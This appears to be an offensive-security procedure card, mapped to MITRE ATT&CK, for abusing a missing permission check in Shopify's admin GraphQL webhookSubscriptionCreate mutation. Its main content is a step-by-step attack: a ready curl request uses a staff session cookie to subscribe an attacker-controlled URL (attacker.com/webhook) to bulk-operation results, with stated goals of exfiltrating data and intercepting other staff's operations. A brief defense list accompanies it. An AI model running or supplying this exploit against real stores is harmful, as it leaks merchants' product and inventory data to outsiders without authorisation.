---
id: proc-uuid-1
tags:
  - graphql
  - webhook
  - authorization-bypass
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/shopify-graphql-webhooksubscriptioncreate]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T17:25:53.527Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Valid Accounts]]'
---
# Create-Unauthorized-Webhook-Subscription-for-BULK-OPERATIONS-FINISH

## Summary

This procedure exploits a broken access control vulnerability in Shopify's GraphQL API to create a webhook subscription for the BULK_OPERATIONS_FINISH topic using a staff account without any required permissions, allowing the receipt of notifications containing bulk operation results at an attacker-controlled endpoint.

## Description

In Shopify's admin GraphQL endpoint, the webhookSubscriptionCreate mutation lacks proper permission checks, enabling low-privilege staff to subscribe to sensitive topics like BULK_OPERATIONS_FINISH. Upon completion of any bulk operation (even triggered by other users), the webhook delivers data to the specified callback URL, potentially leaking product or inventory details. This requires an authenticated session but no specific scopes.

## Requirements

1. Authenticated session as a Shopify staff user (any permission level)
2. Access to the admin GraphQL endpoint (/admin/internal/web/graphql/core)
3. Attacker-controlled HTTPS endpoint to receive webhook payloads
4. Tools like curl for sending HTTP requests

## Defense

Defensive measures and detection strategies:

- Implement strict permission checks on webhook creation mutations for sensitive topics
- Monitor GraphQL logs for unauthorized mutation attempts on webhookSubscriptionCreate
- Validate webhook callback URLs against allowlists and require verification
- Use rate limiting on bulk operation endpoints to detect abuse

## Objectives

1. Establish persistent notification channel for bulk operation data
2. Enable data exfiltration without direct query permissions
3. Intercept operations performed by authorized staff

## Instructions

### Step 1: Prepare the GraphQL Mutation

**Context**: Construct the mutation payload specifying the BULK_OPERATIONS_FINISH topic and attacker callback URL. This bypasses checks due to missing authorization validation.

**Command** ([[commands/shopify-graphql-webhooksubscriptioncreate]]):
```bash
curl -X POST 'https://yourstore.myshopify.com/admin/internal/web/graphql/core?operation=PageStaff' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: _shopify_s=session; _shopify_y=session' \
  -d '{"operationName": "webhookSubscriptionCreate", "variables": {"topic": "BULK_OPERATIONS_FINISH", "webhookSubscription": {"callbackUrl": "https://attacker.com/webhook"}}, "query": "mutation webhookSubscriptionCreate($topic: WebhookSubscriptionTopic!, $webhookSubscription: WebhookSubscriptionInput!) { webhookSubscriptionCreate(topic: $topic, webhookSubscription: $webhookSubscription) { userErrors { field message } webhookSubscription { id } } }"}'
```

> This sends a POST request with the GraphQL mutation. Expected output is a JSON response containing the created webhook's ID under webhookSubscription.id if successful, indicating the bypass worked. If userErrors is empty, the subscription is active.

### Step 2: Verify Webhook Creation

**Context**: Poll the endpoint or check server logs to confirm the webhook receives test notifications.

**Command** (No specific command; use server logs):
```bash
# Monitor your attacker server for incoming POST requests from Shopify
```

> Trigger a test bulk operation via another account and check for payload delivery containing operation details.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Valid Accounts]]

### Sub-Techniques

-

## Commands Used

- [[commands/shopify-graphql-webhooksubscriptioncreate]]

## Tools Used

-

## Tags

- [[graphql]]
- [[webhook]]
- [[authorization-bypass]]
